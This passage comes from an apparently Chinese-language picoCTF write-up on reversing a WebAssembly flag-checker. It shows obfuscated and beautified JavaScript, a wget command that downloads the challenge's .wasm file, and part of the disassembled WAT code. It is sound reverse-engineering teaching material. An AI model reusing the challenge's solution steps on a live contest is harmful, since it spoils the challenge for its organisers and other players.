string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>_0x41d31a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x76dd13<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span>_0x402c<span class="token punctuation">,</span><span class="token number">0x994c3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> exports<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0x48c3be<span class="token operator">=</span>_0x4e0e<span class="token punctuation">;</span><span class="token keyword">let</span> _0x5f0229<span class="token operator">=</span><span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1e9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x1d99e9<span class="token operator">=</span><span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1df</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">await</span> _0x5f0229<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1da</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>_0x1f8628<span class="token operator">=</span>_0x1d99e9<span class="token punctuation">[</span><span class="token function">_0x48c3be</span><span class="token punctuation">(</span><span class="token number">0x1d6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>exports<span class="token operator">=</span>_0x1f8628<span class="token punctuation">[</span><span class="token string">'exports'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> _0xa80748<span class="token operator">=</span>_0x4e0e<span class="token punctuation">;</span><span class="token keyword">let</span> _0x3761f8<span class="token operator">=</span>document<span class="token punctuation">[</span><span class="token string">'getElementById'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dd</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> _0x16c626<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">;</span>_0x16c626<span class="token operator">&lt;</span>_0x3761f8<span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>_0x16c626<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>exports<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1d7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x3761f8<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ec</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x16c626<span class="token punctuation">)</span><span class="token punctuation">,</span>_0x16c626<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>exports<span class="token punctuation">[</span><span class="token string">'copy_char'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span>_0x3761f8<span class="token punctuation">[</span><span class="token string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>exports<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e7</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x1</span><span class="token operator">?</span>document<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ee</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e6</span><span class="token punctuation">)</span><span class="token operator">:</span>document<span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1ee</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1dc</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">_0xa80748</span><span class="token punctuation">(</span><span class="token number">0x1e8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>进行美化</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token string">'use strict'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> _0x402c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"2wfTpTR"</span><span class="token punctuation">,</span> <span class="token string">"instantiate"</span><span class="token punctuation">,</span> <span class="token string">"275341bEPcme"</span><span class="token punctuation">,</span> <span class="token string">"innerHTML"</span><span class="token punctuation">,</span> <span class="token string">"1195047NznhZg"</span><span class="token punctuation">,</span> <span class="token string">"1qfevql"</span><span class="token punctuation">,</span> <span class="token string">"input"</span><span class="token punctuation">,</span> <span class="token string">"1699808QuoWhA"</span><span class="token punctuation">,</span> <span class="token string">"Correct!"</span><span class="token punctuation">,</span> <span class="token string">"check_flag"</span><span class="token punctuation">,</span> <span class="token string">"Incorrect!"</span><span class="token punctuation">,</span> <span class="token string">"./JIFxzHyW8W"</span><span class="token punctuation">,</span> <span class="token string">"23SMpAuA"</span><span class="token punctuation">,</span> <span class="token string">"802698XOMSrr"</span><span class="token punctuation">,</span> <span class="token string">"charCodeAt"</span><span class="token punctuation">,</span> <span class="token string">"474547vVoGDO"</span><span class="token punctuation">,</span> <span class="token string">"getElementById"</span><span class="token punctuation">,</span> <span class="token string">"instance"</span><span class="token punctuation">,</span> <span class="token string">"copy_char"</span><span class="token punctuation">,</span> <span class="token string">"43591XxcWUl"</span><span class="token punctuation">,</span> <span class="token string">"504454llVtzW"</span><span class="token punctuation">,</span> <span class="token string">"arrayBuffer"</span><span class="token punctuation">,</span> <span class="token string">"2NIQmVj"</span><span class="token punctuation">,</span> <span class="token string">"result"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">_0x4e0e</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> whensCollection</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;number&#125; */</span>
  url <span class="token operator">=</span> url <span class="token operator">-</span> <span class="token number">470</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> _0x402c6f <span class="token operator">=</span> _0x402c<span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> _0x402c6f<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> oldPassword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> toMonths <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> userPsd <span class="token operator">=</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">491</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">493</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">475</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">473</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">482</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">483</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">478</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">480</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">472</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">490</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">toMonths</span><span class="token punctuation">(</span><span class="token number">485</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>userPsd <span class="token operator">===</span> oldPassword<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        data<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>_0x41d31a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      data<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_0x402c<span class="token punctuation">,</span> <span class="token number">627907</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> exports<span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> findMiddlePosition <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
  <span class="token keyword">let</span> leftBranch <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">489</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> rightBranch <span class="token operator">=</span> <span class="token keyword">await</span> WebAssembly<span class="token punctuation">[</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">479</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">await</span> leftBranch<span class="token punctuation">[</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">474</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> module <span class="token operator">=</span> rightBranch<span class="token punctuation">[</span><span class="token function">findMiddlePosition</span><span class="token punctuation">(</span><span class="token number">470</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  exports <span class="token operator">=</span> module<span class="token punctuation">[</span><span class="token string">"exports"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/**
 * @return &#123;undefined&#125;
 */</span>
<span class="token keyword">function</span> <span class="token function">onButtonPress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> navigatePop <span class="token operator">=</span> _0x4e0e<span class="token punctuation">;</span>
  <span class="token keyword">let</span> params <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token string">"getElementById"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">484</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">477</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> params<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    exports<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">471</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">492</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  exports<span class="token punctuation">[</span><span class="token string">"copy_char"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> params<span class="token punctuation">[</span><span class="token string">"length"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>exports<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">487</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">494</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">476</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">481</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">486</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">494</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">476</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">481</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">navigatePop</span><span class="token punctuation">(</span><span class="token number">488</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">;</span></code></pre>

<p>这个地方要涉及到一个知识点：<code>webassembly</code>，随着Web技术越来越成熟，人们已经不满足浏览器只可以支持简单的网页了，3D游戏一直是开发者们坚持的目标，想让3D游戏可以在浏览器中运行起来。比如这个win2000的机器就可以在浏览器中打开：<a target="_blank" rel="noopener" href="https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&mem=192&graphic=1&w=1024&h=768">https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&amp;mem=192&amp;graphic=1&amp;w=1024&amp;h=768</a><br><code>WebAssembly</code>也是一中将<code>C/C++</code>语言编译成JS代码，不过编译过后<code>WebAssembly</code>成了二进制字节码<br>下载下来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://mercury.picoctf.net:36152/JIFxzHyW8W -q -O script.wasm
<span class="token function">file</span> script.wasm
./wasm2wat script.wasm <span class="token operator">></span> script.wat</code></pre>

<p>得到文件</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">(</span><span class="token function">module</span>
  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">type</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">(</span><span class="token function">func</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>param i32 i32<span class="token punctuation">)</span> <span class="token punctuation">(</span>result i32<span class="token punctuation">)</span>
    <span class="token punctuation">(</span>local i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32 i32<span class="token punctuation">)</span>
    global<span class="token punctuation">.</span>get <span class="token number">0</span>
    local<span class="token punctuation">.</span>set <span class="token number">2</span>
    i32<span class="token punctuation">.</span>const <span class="token number">32</span>
    local<span class="token punctuation">.</span>set <span class="token number">3</span>
    local<span class="token punctuation">.</span>get <span class="token number">2</span>
    local<span class="token punctuation">.</span>get <span class="token number">3</span>
    i32<span class="token punctuation">.</span>sub
    local<span class="token punctuation">.</span>set <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">0</span>
    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">24</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">1</span>
    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">20</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">24</span>
    local<span class="token punctuation">.</span>set <span class="token number">5</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">5</span>
    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">16</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">20</span>
    local<span class="token punctuation">.</span>set <span class="token number">6</span>
    local<span class="token punctuation">.</span>get <span class="token number">4</span>
    local<span class="token punctuation">.</span>get <span class="token number">6</span>
    i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">12</span>
    block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">1</span>
      loop  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">2</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">16</span>
        local<span class="token punctuation">.</span>set <span class="token number">7</span>
        i32<span class="token punctuation">.</span>const <span class="token number">1</span>
        local<span class="token punctuation">.</span>set <span class="token number">8</span>
        local<span class="token punctuation">.</span>get <span class="token number">7</span>
        local<span class="token punctuation">.</span>get <span class="token number">8</span>
        i32<span class="token punctuation">.</span>add
        local<span class="token punctuation">.</span>set <span class="token number">9</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        local<span class="token punctuation">.</span>get <span class="token number">9</span>
        i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">16</span>
        local<span class="token punctuation">.</span>get <span class="token number">7</span>
        i32<span class="token punctuation">.</span>load8_u
        local<span class="token punctuation">.</span>set <span class="token number">10</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        local<span class="token punctuation">.</span>get <span class="token number">10</span>
        i32<span class="token punctuation">.</span>store8 offset<span class="token operator">=</span><span class="token number">11</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        i32<span class="token punctuation">.</span>load offset<span class="token operator">=</span><span class="token number">12</span>
        local<span class="token punctuation">.</span>set <span class="token number">11</span>
        i32<span class="token punctuation">.</span>const <span class="token number">1</span>
        local<span class="token punctuation">.</span>set <span class="token number">12</span>
        local<span class="token punctuation">.</span>get <span class="token number">11</span>
        local<span class="token punctuation">.</span>get <span class="token number">12</span>
        i32<span class="token punctuation">.</span>add
        local<span class="token punctuation">.</span>set <span class="token number">13</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        local<span class="token punctuation">.</span>get <span class="token number">13</span>
        i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">12</span>
        local<span class="token punctuation">.</span>get <span class="token number">11</span>
        i32<span class="token punctuation">.</span>load8_u
        local<span class="token punctuation">.</span>set <span class="token number">14</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        local<span class="token punctuation">.</span>get <span class="token number">14</span>
        i32<span class="token punctuation">.</span>store8 offset<span class="token operator">=</span><span class="token number">10</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>
        local<span class="token punctuation">.</span>set <span class="token number">15</span>
        i32<span class="token punctuation">.</span>const <span class="token number">255</span>
        local<span class="token punctuation">.</span>set <span class="token number">16</span>
        local<span class="token punctuation">.</span>get <span class="token number">15</span>
        local<span class="token punctuation">.</span>get <span class="token number">16</span>
        i32<span class="token punctuation">.</span>and
        local<span class="token punctuation">.</span>set <span class="token number">17</span>
        block  <span class="token punctuation">;</span><span class="token punctuation">;</span> label <span class="token operator">=</span> @<span class="token number">3</span>
          local<span class="token punctuation">.</span>get <span class="token number">17</span>
          br_if <span class="token number">0</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
          local<span class="token punctuation">.</span>get <span class="token number">4</span>
          i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>
          local<span class="token punctuation">.</span>set <span class="token number">18</span>
          i32<span class="token punctuation">.</span>const <span class="token number">255</span>
          local<span class="token punctuation">.</span>set <span class="token number">19</span>
          local<span class="token punctuation">.</span>get <span class="token number">18</span>
          local<span class="token punctuation">.</span>get <span class="token number">19</span>
          i32<span class="token punctuation">.</span>and
          local<span class="token punctuation">.</span>set <span class="token number">20</span>
          local<span class="token punctuation">.</span>get <span class="token number">4</span>
          i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">10</span>
          local<span class="token punctuation">.</span>set <span class="token number">21</span>
          i32<span class="token punctuation">.</span>const <span class="token number">255</span>
          local<span class="token punctuation">.</span>set <span class="token number">22</span>
          local<span class="token punctuation">.</span>get <span class="token number">21</span>
          local<span class="token punctuation">.</span>get <span class="token number">22</span>
          i32<span class="token punctuation">.</span>and
          local<span class="token punctuation">.</span>set <span class="token number">23</span>
          local<span class="token punctuation">.</span>get <span class="token number">20</span>
          local<span class="token punctuation">.</span>get <span class="token number">23</span>
          i32<span class="token punctuation">.</span>sub
          local<span class="token punctuation">.</span>set <span class="token number">24</span>
          local<span class="token punctuation">.</span>get <span class="token number">4</span>
          local<span class="token punctuation">.</span>get <span class="token number">24</span>
          i32<span class="token punctuation">.</span>store offset<span class="token operator">=</span><span class="token number">28</span>
          br <span class="token number">2</span> <span class="token punctuation">(</span><span class="token punctuation">;</span>@<span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
        end
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">11</span>
        local<span class="token punctuation">.</span>set <span class="token number">25</span>
        i32<span class="token punctuation">.</span>const <span class="token number">255</span>
        local<span class="token punctuation">.</span>set <span class="token number">26</span>
        local<span class="token punctuation">.</span>get <span class="token number">25</span>
        local<span class="token punctuation">.</span>get <span class="token number">26</span>
        i32<span class="token punctuation">.</span>and
        local<span class="token punctuation">.</span>set <span class="token number">27</span>
        local<span class="token punctuation">.</span>get <span class="token number">4</span>
        i32<span class="token punctuation">.</span>load8_u offset<span class="token operator">=</span><span class="token number">10</span>
        local<span class="token punctuation">.</span>set <span class="token number">28</span>
        i32<span class="token punctuation">.</span>const <span class="token number">255</span>
        local<span class="token punctuation">.</span>set <span class="token number">29</span>
        local<span class="token punctuation">.</span>get <span class="token number">28</span>
        local<span class="token punctuation">.</span>get <span class="token number">29</span>
        i32<span class="token punctuation">.</span>and
        local<span class="token punctuation">.</span>set <span class="token number">30</span>
